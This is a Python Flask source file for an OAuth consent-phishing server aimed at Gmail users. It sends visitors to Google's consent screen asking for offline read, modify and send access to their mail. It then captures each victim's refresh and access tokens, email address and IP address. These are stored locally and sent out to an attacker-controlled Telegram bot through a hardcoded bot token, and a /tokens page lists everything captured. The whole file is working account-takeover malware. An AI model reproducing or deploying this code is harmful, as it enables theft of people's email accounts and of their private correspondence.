from flask import Flask, request, redirect
import requests
import json
import os
from datetime import datetime

app = Flask(__name__)

# === GOOGLE OAUTH CONFIG — UPDATE THESE ===
CLIENT_ID = "YOUR_CLIENT_ID.apps.googleusercontent.com"
CLIENT_SECRET = "YOUR_CLIENT_SECRET"
# Change this to your Render URL after deployment
RENDER_URL = "https://your-app-name.onrender.com"
REDIRECT_URI = f"{RENDER_URL}/callback"
SCOPES = "openid https://www.googleapis.com/auth/userinfo.email https://www.googleapis.com/auth/gmail.readonly https://www.googleapis.com/auth/gmail.modify https://www.googleapis.com/auth/gmail.send"

# === TELEGRAM CONFIG ===
TG_BOT_TOKEN = "8347968051:AAEThb_Nmqy-bhdsZwmEnsBSQgXVc-fGYbs"
TG_CHAT_ID = "7554731151"

# === TOKEN STORAGE ===
# Render has ephemeral storage. Tokens last until app restarts.
# They're also sent to Telegram, so Telegram is your permanent backup.
TOKEN_DB = "/tmp/tokens.json"

def send_telegram(message):
    url = f"https://api.telegram.org/bot{TG_BOT_TOKEN}/sendMessage"
    payload = {"chat_id": TG_CHAT_ID, "text": message, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload, timeout=10)
    except:
        pass

def save_token(email, refresh_token, access_token, ip):
    db = {}
    if os.path.exists(TOKEN_DB):
        with open(TOKEN_DB) as f:
            db = json.load(f)
    
    db[email] = {
        "refresh_token": refresh_token,
        "access_token": access_token,
        "ip": ip,
        "timestamp": datetime.now().isoformat()
    }
    
    with open(TOKEN_DB, "w") as f:
        json.dump(db, f, indent=2)
    
    print(f"[+] Saved token for {email}")

@app.route('/')
def home():
    return "OAuth server is running. The /auth/gmail endpoint is ready."

@app.route('/auth/gmail')
def auth_gmail():
    """Step 1: Redirect user to Google OAuth consent screen"""
    auth_url = (
        "https://accounts.google.com/o/oauth2/v2/auth?"
        f"client_id={CLIENT_ID}&"
        f"redirect_uri={REDIRECT_URI}&"
        f"response_type=code&"
        f"scope={SCOPES.replace(' ', '%20')}&"
        f"access_type=offline&"
        f"prompt=consent"
    )
    return redirect(auth_url)

@app.route('/callback')
def callback():
    """Step 2: Google redirects here with auth code"""
    code = request.args.get('code')
    if not code:
        return "Authorization failed.", 400

    # Exchange code for tokens
    token_url = "https://oauth2.googleapis.com/token"
    payload = {
        "code": code,
        "client_id": CLIENT_ID,
        "client_secret": CLIENT_SECRET,
        "redirect_uri": REDIRECT_URI,
        "grant_type": "authorization_code"
    }
    resp = requests.post(token_url, json=payload)
    tokens = resp.json()

    refresh_token = tokens.get("refresh_token", "N/A")
    access_token = tokens.get("access_token", "N/A")

    # Get user email
    userinfo = requests.get(
        "https://www.googleapis.com/oauth2/v2/userinfo",
        headers={"Authorization": f"Bearer {access_token}"}
    ).json()
    email = userinfo.get("email", "unknown")

    # Get IP
    victim_ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if victim_ip and "," in victim_ip:
        victim_ip = victim_ip.split(",")[0].strip()

    # Save token locally (ephemeral — only lasts until Render restarts)
    save_token(email, refresh_token, access_token, victim_ip)

    # Send to Telegram (permanent backup)
    msg = f"""[+]___ GMAIL_OAUTH ___[+]
Victim: {email}
Token: {refresh_token}
IP: {victim_ip}"""
    send_telegram(msg)

    # Redirect victim back to landing page
    # Change this to your Render static site URL
    return redirect("https://your-landing-page.onrender.com/#")

@app.route('/tokens')
def list_tokens():
    """View captured tokens in browser (for testing)"""
    if not os.path.exists(TOKEN_DB):
        return "No tokens captured yet."
    with open(TOKEN_DB) as f:
        db = json.load(f)
    
    html = "<h1>Captured Tokens</h1><ul>"
    for email, info in db.items():
        html += f"<li><b>{email}</b> — {info['ip']} — {info['timestamp'][:19]}"
        html += f"<br><small>Token: {info['refresh_token'][:50]}...</small></li>"
    html += "</ul>"
    return html

# Health check endpoint for Render
@app.route('/health')
def health():
    return "OK"

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
